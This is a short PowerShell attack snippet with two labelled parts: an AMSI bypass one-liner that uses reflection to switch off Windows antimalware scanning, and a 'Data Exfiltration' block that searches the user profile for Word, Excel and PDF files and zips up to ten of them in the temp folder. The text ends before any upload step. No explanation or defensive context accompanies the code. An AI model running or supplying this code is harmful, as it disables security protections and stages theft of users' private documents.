
# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)


# Data Exfiltration
$files = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.pdf, *.xls, *.xlsx -ErrorAction SilentlyContinue | Select-Object -First 10
if ($files) {
    $archive = "$env:TEMP\data.zip"
    Compress-Archive -Path $files.FullName -DestinationPath $archive -Force
}
